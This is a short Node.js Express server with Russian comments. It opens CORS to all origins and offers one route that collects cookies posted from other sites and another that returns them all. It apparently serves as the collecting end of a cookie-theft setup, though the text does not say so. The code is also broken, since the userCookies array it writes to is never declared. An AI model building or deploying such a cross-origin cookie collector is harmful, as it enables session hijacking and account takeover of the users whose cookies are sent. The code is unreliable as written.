const express = require('express');
const cors = require('cors'); // Подключаем модуль cors
const path = require('path');
const app = express();
const port = 3000;

app.use(cors()); // Разрешаем запросы с других доменов
app.use(express.json());

// Определите папку для статических файлов
app.use(express.static(path.join(__dirname, 'public')));

// Маршрут для хранения куки
app.post('/api/store-cookies', (req, res) => {
    const { cookies } = req.body;
    // Сохраняем куки в массиве (в реальном приложении используйте базу данных)
    userCookies.push(cookies);
    console.log('Cookies stored:', cookies);
    res.json({ status: 'success' });
});

// Маршрут для получения куки
app.get('/api/get-cookies', (req, res) => {
    res.json(userCookies);
});

// Запуск сервера
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
